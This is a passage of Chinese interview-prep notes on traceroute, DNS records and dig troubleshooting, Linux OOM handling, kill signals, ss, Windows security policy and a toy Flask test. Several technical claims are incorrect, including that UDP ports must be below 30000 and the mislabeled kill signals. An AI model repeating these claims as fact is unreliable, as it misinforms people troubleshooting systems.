指令怎麼使用嗎?甚麼情況下你會用到這個指令?<br>主要是用於即時網絡故障排除，以查找封包在通過網路傳輸到其目標地址時所採用的路由路徑<br>主要是透過發送ICMP封包，並設定IP Header上的TTL欄位來達成traceroute功能的<br>每次送出的為3個40bytes的封包，包括source位址，目的位址和封包發出的timestamp到目的地，第一個會是probe(探測用)，然後是走UDP，由於我們不想目的主機處理它們，因此目的埠設定為一個不可能的值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tracert -d -h maximum_hops -j host_list -w timeout target_host</span><br><span class="line">-w 要指定等待timeout的毫秒數</span><br></pre></td></tr></table></figure></li><li>當 <code>tracert</code> 指令中出現星號代表甚麼?<ul><li>若tracert出現星號(*)，代表該節點可能有某些防禦措施，使我們的封包被丟棄<ul><li>可能是iptables設定為Drop之類的</li></ul></li></ul></li><li>講解一下 <code>tracert</code> 指令的原理是甚麼嗎?<ul><li>特性1: 主要是透過 TTL(Time_To_Live)值來是現功能的，每經過一個節點，路由器就會幫TTL值減1</li><li>特性2: 主要呼叫者會發出 TTL&#x3D;1的封包，第一個路由器將TTL減1後得到0，不再繼續值轉發此封包</li><li>而會返回一個ICMP Time_Out Response，然後電腦就會從Response中提取出封包經過的第一個gateway地址</li><li>接著發出一個TTL&#x3D;2的ICMP封包，可以獲得第二個gateway地址</li><li>因此依次遞增TTL值便獲取沿途所有Gatewat位址</li></ul></li><li>如果 <code>tracert</code> 回傳response並不是ICMP Time_Out，代表甚麼?<ul><li>大多防火牆或啟用防火牆功能的路由器預設會不返回各種ICMP封包</li><li>其餘路由器或交換器可被admin設定成不返回ICMP Response</li><li><strong>因此 Traceroute程式不一定能夠拿到所有沿途gateway位址</strong><ul><li>當某個TTL值的封包得不到回覆時，並不能停止這一追蹤過程，程式仍然會把TTL遞增然後發出下一個封包，一直到預設會透過參數指定的<strong>追蹤限制(maximum_hops)</strong></li></ul></li></ul></li><li>若無法回應ICMP Response，那又是如何知道封包抵達了?<ul><li>Traceroute在送出UDP datagrams到目的地時，它所選擇送達的port number 是一個一般應用程式都不會用的號碼（<strong>30000 以上</strong>）</li><li>所以當此UDP datagram 到達目的地後該主機會送回一個「<strong>ICMP port unreachable</strong>」的訊息，而當traceroute 收到這個訊息時，便知道目的地已經到達了。</li></ul></li><li>為甚麼traceroute要使用大於30000的port<ul><li>跟UDP規定port號必須小於30000有關</li><li>若使用UDP則可能會因為主機沒有提供 UDP 服務而簡單將封包拋棄，然後不返回任何資訊</li><li>所以使用大於30000的port，目標主機能做的是就是返回一個 <strong>port不可達</strong> 的回應</li></ul></li><li><a href="https://haway.30cm.gg/dns-1-basic/">甚麼是FQDN(完整網域名稱?)</a><ul><li>在&#x2F;etc&#x2F;resolv.conf中，沒有加上”.” 結尾的主機名稱，都會被系統自動附加網域名稱</li><li>然後檔案中的<strong>search</strong> 就是告訴系統可以附加什麼樣的網域名稱  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domain rsync.tw</span><br><span class="line">nameserver 168.95.1.1 (cache server)</span><br><span class="line">nameserver 8.8.8.8  (cache server)</span><br><span class="line">search hdns.com.tw example.com</span><br></pre></td></tr></table></figure></li><li>上方範例中只要輸入blog，系統就會自動改為blog.rsync.tw並送到168.95.1.1去做DNS解析，但如果不成功就會換成blog.hdns.com.tw再次嘗試，以此類推</li><li>若168.95.1.1的DNS服務無法連上，系統就會自動跳到第二筆的8.8.8.8伺服器</li></ul></li><li>要怎麼設定DNS Cache Server?<ul><li>去&#x2F;etc&#x2F;resolv.conf更改 nameserver</li></ul></li><li><strong>DNS權威Server以及DNS Cache Server差別?</strong><ul><li>DNS Authoritative Server:會從自己的資料庫取出DNS紀錄並回應請求</li><li>Cache Server則是去詢問其他主機的DNS資料</li></ul></li><li>DNS中甚麼是NS(Nameserver)紀錄?<br>  <img src="https://i.imgur.com/YMAcJ1x.png"><ul><li>root server會去記錄每個子網域的授權主機位置就是透過NS Record</li><li>NS Record的用途有兩個:一個是向下授權、一個是平行授權</li><li>向下授權: 建立一個子網域 (EX. 跟Server建立一個.tw的子網域)，並授權給TWNIC的主機</li><li>平行授權: 同個網域名稱的所有NameServer，都必須有相同的NS紀錄<br>  <img src="https://i.imgur.com/9mo0lwG.png"></li><li>上面就是 ntpu.edu.tw 已經授權給六台nameserver，這六台的ntpu.edu.tw的ns紀錄必須完全一樣</li></ul></li><li>要怎麼知道自己的DNS主機目前正式授權到哪些主機上面?<ul><li>購買網域名稱時後填寫的Nameserver，註冊商會依照所註冊的域名</li><li>把你的nameserver送給Registry，Registry確認後就會把你的主機資料放入他們的紀錄中</li><li>就會產生一組NS資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig [domain] ns</span><br></pre></td></tr></table></figure></li><li>透過上述指令確認目前NameServer資料是否跟註冊時填寫一致</li></ul></li><li>甚麼是SOA Record?<ul><li>SOA紀錄是<strong>網域名稱的系統管理紀錄</strong></li><li>若使用代管則不需要處理(CloudFlare, Gandi LiveDNS)</li><li>自架的DNS主機則會需要設定</li><li>主要代表者會是網域名稱的管理者、管理主機、區域檔序號與全域性的TTL資料</li></ul></li><li>甚麼是A&#x2F;AAAA紀錄<ul><li>當要將網域名稱對應到Server的IP位址時，就需要用到A紀錄</li><li>A紀錄指向到IPv4位址</li><li>AAAA紀錄指向到IPv6位址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short blog.rsync.tw a</span><br><span class="line">$ dig +short blog.rsync.tw aaaa</span><br></pre></td></tr></table></figure></li></ul></li><li>甚麼是MX紀錄?<ul><li>這個網域的mail server紀錄</li><li>如果有人寄信給你，郵件主機會優先查詢這個網域名稱有沒有 MX 紀錄</li><li>如果有，就會連線到郵件主機，如果沒有特別設定 MX 紀錄</li><li>寄送郵件的主機會嘗試解析網域名稱的 A 紀錄</li><li>如果有 A 紀錄，就會嘗試連線主機的郵件伺服器。<br>  <img src="https://i.imgur.com/eQNw7LE.png"></li><li>當Domain Name有MX紀錄，mail主機會嘗試連線mg.ntust.edu.tw</li><li>MX紀錄中可以設定mail server優先順序，數值越小的優先</li><li>所以寄給ntust.edu.tw的信，會優先送給 mg.ntust.edu.tw</li><li>若沒有mx紀錄，則會送給Domain Name名稱的A紀錄，即140.118.31.99<br>  <img src="https://i.imgur.com/rO5idoQ.png"></li></ul></li><li>甚麼是CNAME紀錄?<ul><li><strong>主機名稱的別名的一種</strong>，當你的目的位址是主機名稱時，而不是IP位址</li><li>這時則須要使用CNAME進行對應</li><li>限制: 同一筆紀錄底下如果有設定CNAME紀錄，就不能設定其他紀錄<ul><li>為甚麼?</li></ul></li><li>EX. <strong>若設定某個domain的CNAME，則不可設定A、MX、TXT等紀錄</strong></li></ul></li><li>若有人設定某個Domain Name的CNAME，例如我註冊 HelloWorld.tw 然後想要把網頁瀏覽者連到跟blog.HelloWorld.tw一樣的網站，所以設定了  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld.tw  CNAME  blog.HelloWorld.tw</span><br></pre></td></tr></table></figure><ul><li>但HelloWorld.tw一定帶有SOA與NS紀錄，會跟CNAME產生衝突，會造成網域名稱運作不穩定，所以若要完成一樣的功能可以透過網頁跳轉的方式來完成</li></ul></li><li>可以講解一下 <code>dig</code> 指令怎麼使用嗎?甚麼情況下你會用到這個指令?.<ul><li>是一種DNS除錯工具，能夠模擬一般電腦查詢、遞迴查詢、非遞迴查詢、DNS 快取伺服器查詢、DNSSEC 查詢、TCP 查詢等等。</li><li><code>dig</code> 的回應區段<br>  <img src="https://i.imgur.com/kHAra1e.png"><ul><li>Header<br>  <img src="https://i.imgur.com/nr5u3aS.png"><ul><li>ID: 純數字，DNS查詢的識別碼</li><li>QR:0查詢 1 回應</li><li>Opcode: 0 QUERY,1 IQUERY, 2 STATUS</li><li>AA: 權威伺服器回應</li><li>TC: 截斷</li><li>RD: 用戶端是否要求遞迴查詢</li><li>RA: 伺服器回應是支援遞迴查詢</li><li>Z: 保留</li><li>RCODE: 0沒有錯誤、1-5 錯誤代碼</li><li>QDCOUNT: Question區段的資料數量</li><li>ANCOUNT: Answer區段的資料數量</li><li>NSCOUNT: Authority區段的資料數量</li><li>ARCOUNT: Additional區段的資料數量</li></ul></li><li>Question</li><li>Answer</li><li>Authority</li><li>Additional</li></ul></li><li><code>dig</code>的參數<ul><li><code>@server</code> 指定伺服器，<strong>對哪台Server發出DNS查詢，若不指定則使用系統預設</strong></li><li><code>+short</code> 簡略輸出，只顯示ANSWER部分，若沒回應則顯示空白</li><li><code>-4</code> 只使用 IPv4位址進行與Server的連線</li><li><code>-6</code> 只使用 IPv6位址進行與Server的連線</li><li><code>+tcp</code> 使用TCP的方式與DNS Server連線<ul><li><strong>DNS原生是使用 UDP&#x2F;53 協定</strong>，若有人忘記開啟主機或IP分享器的防火牆</li><li>則會透過 <code>+tcp</code> 的方式將DNS查詢改為TCP連線</li><li>若一般查詢沒回應，而<code>+tcp</code>會過，則代表防火牆沒有開啟</li></ul></li><li><code>cdflag</code> 用於關閉DNSSEC查詢<ul><li>DNSSEC是一種DNS的延伸安全協定，可以確保DNS紀錄無法被偽造(透過電子簽章的方式)</li><li>若DNSSEC管理不當則會造成DNSSEC驗證失敗</li><li>會發生不穩定的DNS解析</li><li>此時可以透過此參數將其關閉</li><li>若一般查詢沒回應，但+cdflag後有正確回應，則代表DNSSEC壞掉</li></ul></li></ul></li><li>指令範例  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 查詢快取Server的A紀錄</span><br><span class="line">$ dig @8.8.8.8 blog.rsync.tw. a</span><br><span class="line"># 查詢Domain Name的MX</span><br><span class="line">$ dig rsync.tw mx</span><br><span class="line"># 查詢Domain Name負責人</span><br><span class="line">$ dig rsync.tw soa</span><br><span class="line"># 追蹤模式</span><br><span class="line">$ dig +trace blog.rsync.tw a</span><br><span class="line"># tcp查詢模式</span><br><span class="line">$ dig +tcp blog.rsync.tw a</span><br><span class="line"># 查詢IP反解  = nslookup &lt;IP&gt;</span><br><span class="line">$ dig -x 8.8.8.8 ptr</span><br><span class="line"># 關閉DNSSEC查詢</span><br><span class="line">$ dig +cdflag @8.8.8.8 blog.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>DNS Troubleshooting<ul><li>step 1 : 查詢NS位址<ul><li>在你作 dig 除錯開始之前，首先你要確認網域名稱的名稱伺服器(NameServer) 位址，因為所有回應都一定從名稱伺服器回應，所有使用Domain Name Registry或是Cloudfare之類的服務則NameServer會是這些業者，也有是註冊時填寫的NameServer欄位資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short rsync.tw ns</span><br></pre></td></tr></table></figure></li><li>可看出NameServer是哪幾台(DNS紀錄由哪幾台負責)</li><li>或是由淺入深從較高層的DNS Server查下來  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/4t141yp.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short @a.dns.tw edu.tw ns</span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/EZmwnTT.png">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig +short  @moestar.edu.tw [target domain name] ns</span><br></pre></td></tr></table></figure></li><li>為何不直接 dig +short ntust.edu.tw ?<br>  <img src="https://i.imgur.com/6miPWp1.png"><ul><li>因為這樣會透過系統Cache Server去查詢DNS NS紀錄</li></ul></li></ul></li><li>可能發生的情況:<ul><li>空的、沒回應<ul><li>如果你在查詢 NS 的時候出現錯誤，或是發現有回應，但是沒有資料</li><li>可能情況-1: NameServer填錯，請Domain Name Registry檢查</li><li>可能情況-2: 網遇到期沒繳錢，或狀況有問題(透過<code>Whois</code> 指令來查看)</li></ul></li><li>NameServer是Public DNS<ul><li>有人會把Public DNS以為是NameServer，就把8.8.8.8填入nameserver那邊，但這樣是不對的</li></ul></li><li>跟你填的資料不同<ul><li>Domain Name Registry沒有將你的名稱更新到域名管理局或是你剛好更換NameServer中</li></ul></li></ul></li><li>Step 2 : 直接查詢Name Server的資料<ul><li>確認NS位址後，接下來對Name Server送出查詢</li><li>查詢你要解析的域名，稱伺服器回應的資料應該是最新、最完整的，所以你要知道紀錄更新了沒、解析到底正不正確，都是透過直接查詢名稱伺服器來獲得解答。<br>  <img src="https://i.imgur.com/MHvHAb6.png"></li></ul></li><li>可能發生的問題-2:<ul><li>NameServer同步不一致<ul><li>確保每台NameServer回應資料都是正確的</li></ul></li><li>NameServer無回應<ul><li>代表NameServer的DNS服務有問題</li><li>可能DNS服務沒啟用或機器有問題</li><li>可以ping一下NameServer，如果有回應就是DNS服務的問題</li><li>則可透過 <code>dig +tcp</code>來檢查是不是防火牆的問題</li><li>若有回應則要朝向防火牆的問題去解決  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查詢Name Server回應，可以查詢SOA，因為一定有這筆紀錄</span><br><span class="line">$ dig @(NS IP) (domain) soa</span><br><span class="line">#如果沒回應，ping看看是不是主機或網路問題</span><br><span class="line">$ ping (NS IP)</span><br><span class="line"># 如果ping有回應，則改用+tcp 來檢查是不是防火牆問題</span><br><span class="line">$ dig +tcp @(NS IP) (domain) soa</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>Step 3 : 檢查Authority Server回答<ul><li>nameserver通常是由上往下授權<ul><li>ex. rsync.tw nameserver是由.tw往下授權到 ns[1-3].gandi.net的nameserver的</li></ul></li><li>授權不一定正確(其實是使用者自己填的，可能會填錯)，上層依照使用者輸入的資料直接變成NameServer</li><li>正確授權:<ul><li><ol><li>由上對下正確授權</li></ol></li><li><ol start="2"><li>伺服器具備權威伺服器的回答  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ dig @ns1.gandi.net rsync</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; @ns1.gandi.net rsync.tw a</span><br><span class="line">; (2 servers found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45858</span><br><span class="line">;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line">;; WARNING: recursion requested but not available</span><br><span class="line">...omit...</span><br></pre></td></tr></table></figure></li></ol></li></ul></li><li>不使用 +short 參數，就可以看到Header部分，可以看Header中的<strong>AA Flag</strong> </li><li>回應中，有一個 “flags: qr aa rd;”，aa &#x3D; AA 就是權威伺服器回答的意思</li><li>代表這台Server知道自己管理了此網域，所以從區域檔中的資料回應給查詢端</li><li>對Public DNS查詢則不會有這個AA Flag</li><li>而若是對Name Server查詢而沒有AA，則代表管理員沒有正確設定Server</li></ul></li><li>Step 4 : 查詢Cache Server(Public DNS)<ul><li>最後一步就是要查詢快取伺服器的回應資料，看看是否正確，一般所有的用戶電腦都會透過快取伺服器 (譬如8.8.8.8、168.95.1.1) 取得 DNS 的資料，所以我們要測試一下是否正確：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dig @8.8.8.8 www.rsync.tw a</span><br></pre></td></tr></table></figure></li></ul></li><li>可能發生的問題-4<ul><li>查詢到舊資料<ul><li>DNS 有TTL暫存時間</li><li>暫存時間內，都會保留資料直到TTL(秒)時間過去</li><li>這時需要確認每個Authority Server的查詢是否都是最新資料</li></ul></li><li>解析失效NXDOMAIN<ul><li>若上述查詢過程中都沒問題，但Public DNS這些快取Server卻沒反應</li><li>可能是 DNSSEC壞掉了</li><li>此時需要找你的Domain Name的註冊商去取消你的DNSKEY金鑰</li></ul></li></ul></li></ul></li><li>[DNSSEC壞掉會發生甚麼事?該怎麼修復]<a href="https://haway.30cm.gg/dnssec-broken/">(https:&#x2F;&#x2F;</a>)?<ul><li>現象:<ul><li>可能就只有透過授權給你的domain的權威DNS Server能夠查詢到你的A紀錄</li><li>但你如果查詢Public DNS Server(ex. 8.8.8.8)中A的你的domain的A紀錄可能藉會報錯</li></ul></li><li>檢查: <ul><li>這時可以透過 加上 <code>+cdflag</code> 參數來讓DNS Cache Server關閉DNSSEC驗證</li><li><code>cdflag</code> 就是告訴8.8.8.8，這個DNS查詢不需要進行DNSSEC驗證</li></ul></li><li>可能原因:<ul><li>若使用了某個域名代管服務，並開啟了DNSSEC</li><li>但後續又將Nameserver變更，這將會導致DNSSEC Chain 驗證失敗</li><li>因為DNSKEY沒有被移轉(新的Name Server中沒有DNSKEY)，則會導致驗證失敗</li></ul></li><li>解決方式: <ul><li>或是使用域名註冊商提供的介面並關閉DNSSEC的功能</li><li>或是在新的NameServer上重新簽署DNSSEC，然後更新DNSKEY</li></ul></li></ul></li><li>在LINUX中如何開啟DNSSEC?<ul><li>可修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf中的DNSSEC設定值</li></ul></li><li>在&#x2F;etc&#x2F;resolv.conf中設定的nameserver被重置怎麼辦?<ul><li>透過 symbolic link指向 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc</span><br><span class="line">$ rm resolv.conf</span><br><span class="line">$ ln -s /run/systemd/resolve/resolv.conf resolv.conf</span><br></pre></td></tr></table></figure></li><li>直接修改 &#x2F;etc&#x2F;systemd&#x2F;resolv.conf 中的DNS位址</li></ul></li><li>你會去怎麼處理Linux中Process的OOM問題?</li><li>甚麼是<strong>OOM Killer</strong>?<ul><li>Linux中負責監控那些占用memory過大，尤其是瞬間很快消耗大量memory的process</li><li>為了防止memory耗盡而kernel會把該process kill掉</li><li>有時候SSH不到機器，但能 ping 通，說明不是網絡的故障，很多原因是 sshd process被 OOM killer 殺掉了</li><li>Kernel會通過特定的演算法給每個process計算一個分數來決定殺哪個process</li><li>每個process的 OOM 分數可以在「**&#x2F;proc&#x2F;PID&#x2F;oom_score**」中找到</li><li>重啟機器後查看系統日誌「**&#x2F;var&#x2F;log&#x2F;messages**」會發現「Out of Memory: Kill process 1865（sshd）」類似的錯誤訊息</li><li><code>echo -17 /proc/PID/oom_adj</code> 來解決這個問題<ul><li>可調範圍: 15~ -16</li><li>-17是禁用</li></ul></li><li>或是修改Kernel參數:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.panic_on_oom=1 (預設為0)</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></li></ul></li><li><code>kill -9</code> 與 <code>kill -15</code> 差別在哪?送的signal是甚麼?  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ kill PID</span><br><span class="line"># 訊號: SIGKILL</span><br><span class="line">$ kill -9 PID //立即強制停止程式執行</span><br><span class="line"># 訊號: SIGTERM</span><br><span class="line">$ kill -15 PID //以正常程序通知程式停止執行，預設的訊號</span><br><span class="line">$ kill -l 列出所有可用訊號</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/1INBiak.png"></li><li>怎麼查詢kill指令中哪個訊號對應甚麼數字<ul><li><code>$ kill -l &lt;數字&gt;</code></li></ul></li><li>可以解釋一下 <code>ss</code>指令的使用時機嗎?<ul><li>可以輸出所有已經建立的 TCP 連線</li><li>ss 指令可以自己指定篩選器（filter），篩選出自己需要的 sockets 資訊:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 列出從本機連線到 192.168.0.1 這台主機的所有連線：</span><br><span class="line">$ ss -o state established dst 192.168.0.1</span><br><span class="line"># 列出從本機連線到 192.168.0.1 主機 80 連接埠的所有連線</span><br><span class="line">$ ss -o state established dst 192.168.0.1:80</span><br><span class="line"># 列出來自於 192.168.0.2 這台主機的所有連線：</span><br><span class="line">$ ss -o state established src 192.168.0.2</span><br><span class="line"># 列出所有 ssh 的連線，包含從本機往外的 ssh 連線，以及從外面連線進來的 ssh 連線：</span><br><span class="line">$ ss -o state established &#x27;( dport = :ssh or sport = :ssh )&#x27;</span><br></pre></td></tr></table></figure></li></ul></li><li>在Linux中如何列出服務?<ul><li>去 &#x2F;etc&#x2F;init.d 查看</li><li>或 <code>systemctl list-units --type service -all</code></li><li><code>sudo systemctl | grep running</code></li><li><code>service --status-all</code></li></ul></li><li>如何查看已建立的sockets<ul><li><code>systemctl list-sockets</code></li><li><code>netstat</code></li><li><code>ss</code></li></ul></li></ul><h2 id="app-檢測"><a href="#app-檢測" class="headerlink" title="app 檢測"></a>app 檢測</h2><p><a href="https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf">https://www.mas.org.tw/spaw2/uploads/files/20190916/AppV3.1.pdf</a></p><h2 id="Windows-Admin"><a href="#Windows-Admin" class="headerlink" title="Windows Admin"></a>Windows Admin</h2><ul><li>安全性設定<ul><li>若要使用 Local 安全性原則主控台設定設定:<ul><li>win+R</li><li><code>secpol.msc</code></li><li>在主控台設定安全性命令下，執行下列其中一項操作：<ul><li>按一下 [帳戶政策 &gt; 以編輯 <strong>密碼政策</strong> 或 <strong>帳戶鎖定政策</strong></li><li>按一下 [本地原則 以編輯 <strong>稽核原則</strong>、<strong>使用者</strong> <strong>許可權指派</strong>或 <strong>安全性選項</strong></li></ul></li></ul></li><li>若要使用本機群組策略編輯器主控台設定安全性原則設定<ul><li>win +R</li><li><code>gpedit.msc</code></li><li>在主控台樹狀樹中，按一下 [電腦組Windows 設定 ，然後按一下[安全性設定。</li><li>執行下列其中一項：<ul><li>按一下 [帳戶政策 &gt; 以編輯 密碼政策 或 帳戶鎖定政策。</li><li>按一下 [本地原則 以編輯 稽核原則、使用者 許可權指派或 安全性選項。</li></ul></li></ul></li></ul></li></ul><h2 id="網頁測試"><a href="#網頁測試" class="headerlink" title="網頁測試"></a>網頁測試</h2><ul><li><p>有做過網頁單元測試嗎?<br>  主要架設小型的Flask Web Server<br>  然後有自己建立小型的測試用的服務<br>  <em>test_api.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import json</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">server = flask.Flask(__name__)</span><br><span class="line">@server.route(&#x27;/login&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">username = request.values.get(&#x27;name&#x27;)</span><br><span class="line">pwd = request.values.get(&#x27;pwd&#x27;)</span><br><span class="line">if username and pwd:</span><br><span class="line">if username == &#x27;xiaoming&#x27; and pwd == &#x27;111&#x27;:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 200, &#x27;message&#x27;: &#x27;Login Success&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False) </span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: -1, &#x27;message&#x27;: &#x27;Login Failed&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line">else:</span><br><span class="line">resu = &#123;&#x27;code&#x27;: 10001, &#x27;message&#x27;: &#x27;Parameter cannot be empty&#x27;&#125;</span><br><span class="line">return json.dumps(resu, ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">server.run(debug=True, port=8888, host=&#x27;127.0.0.1&#x27;)</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/3UFNrTT.png"><br>  <em>config.ini</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">[HTTP]</span><br><span class="line">scheme = http</span><br><span class="line">baseurl = 127.0.0.1</span><br><span class="line">port = 8888</span><br><span class="line">timeout = 10.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[EMAIL]</span><br><span class="line">on_off = on;</span><br><span class="line">subject = Auto testing Report</span><br><span class="line">app = Outlook</span><br><span class="line">addressee = M10909302@gmail.com</span><br></pre></td></tr></table></figure><p>  <em>getpathInfo.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def get_Path():</span><br><span class="line">path = os.path.split(os.path.realpath(__file__))[0]</span><br><span class="line">return path</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;测试路径是否OK,路径为：&#x27;, get_Path())</span><br></pre></td></tr></table></figure><p>  執行結果<br>  <img src="https://i.imgur.com/SOJEwRf.png"></p><p>  <em>readConfig.py</em></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import configparser</span><br><span class="line">import getpathInfo </span><br><span class="line"></span><br><span class="line">path = getpathInfo.get_Path()</span><br><span class="line">config_path = os.path.join(path, &#x27;config.ini&#x27;)</span><br><span class="line">config = configparser.ConfigParser()</span><br><span class="line">config.read(config_path, encoding=&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">class ReadConfig():</span><br><span class="line"></span><br><span class="line">def get_http(self, name):</span><br><span class="line">value = config.get(&#x27;HTTP&#x27;, name)</span><br><span class="line">return value</span><br><span class="line">def get_email(self, name):</span><br><span class="line">value = config.get(&#x27;EMAIL&#x27;, name)</span><br><span class="line">return value</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">print(&#x27;The Baseurl Value in HTTP is：&#x27;, ReadConfig().get_http(&#x27;baseurl&#x27;))</span><br><span class="line">print(&#x27;The on_off value in EMAIL is: &#x27;, ReadConfig().get_email(&#x27;on_off&#x27;</span><br></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/KyVjXZL.png"></p><blockquote><p><a href="https://itpcb.com/a/1297735">https://itpcb.com/a/1297735</a></p></blockquote></li></ul><h2 id="RESTFUL-API"><a href="#RESTFUL-API" class="headerlink" title="RESTFUL API"></a>RESTFUL API</h2><ul><li>請問你對於RESTFul Web服務的理解是甚麼?<ul><li>RESTFul Web Service就是遵循REST風格的Web服務架構</li><li>REST(Representational State Transfer)並使用HTTP來實踐</li></ul></li><li>甚麼是REST 